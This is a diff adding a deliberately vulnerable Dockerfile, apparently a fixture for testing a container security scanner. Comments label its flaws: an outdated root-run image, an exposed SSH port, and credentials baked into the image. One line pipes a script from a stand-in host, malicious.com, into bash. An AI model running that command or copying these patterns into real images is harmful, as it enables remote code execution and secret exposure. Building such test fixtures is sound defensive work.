@@ -1,0 +1,24 @@
+
+# Vulnerable Dockerfile for testing
+FROM ubuntu:16.04
+
+# A01: Use of outdated base image (EOL)
+# A02: Running as root by default (no USER specified)
+
+RUN apt-get update && \
+    apt-get install -y openssh-server curl wget git python && \
+    apt-get clean
+
+# A03: Exposing unnecessary port
+EXPOSE 22
+
+# A04: Copying secrets into image (not secure)
+COPY credentials.txt /root/credentials.txt
+
+# A05: No security patches or package pinning
+
+# A06: Adding scripts without checksum verification
+RUN curl http://malicious.com/install.sh | bash
+
+# A07: No health check or validation
+CMD ["/bin/bash"]
